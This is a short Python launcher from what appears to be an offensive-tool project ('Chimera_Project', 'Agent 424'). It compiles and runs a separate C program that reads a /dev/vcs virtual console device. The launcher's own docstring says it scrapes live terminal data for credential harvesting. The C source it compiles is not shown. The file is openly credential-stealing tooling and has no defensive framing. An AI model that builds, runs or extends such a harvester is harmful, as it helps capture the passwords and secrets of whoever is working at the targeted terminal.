#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess
import sys

class ScreenSniffer:
    """
    Agent 424: Terminal Buffer Extraction.
    Compiles and executes the C-native sniffer to scrape 
    live terminal data for credential harvesting.
    """
    def execute(self, vcs_path):
        print(f"--- [AGENT 424: SCREEN SNIFF SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/424_Screen_Sniffer/src/sniffer.c"
        bin_out = "/home/dan/Chimera_Project/agents/424_Screen_Sniffer/src/sniffer"
        
        # Compile
        subprocess.run(["gcc", src, "-o", bin_out], check=True)
        
        # Execute (Requires Root/Group 'tty' access to read /dev/vcs)
        if os.getuid() != 0:
            print("[!] Warning: Reading /dev/vcs usually requires Root privileges.")

        subprocess.run([bin_out, vcs_path])

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py <vcs_device_path>")
        sys.exit(1)
    
    ScreenSniffer().execute(sys.argv[1])
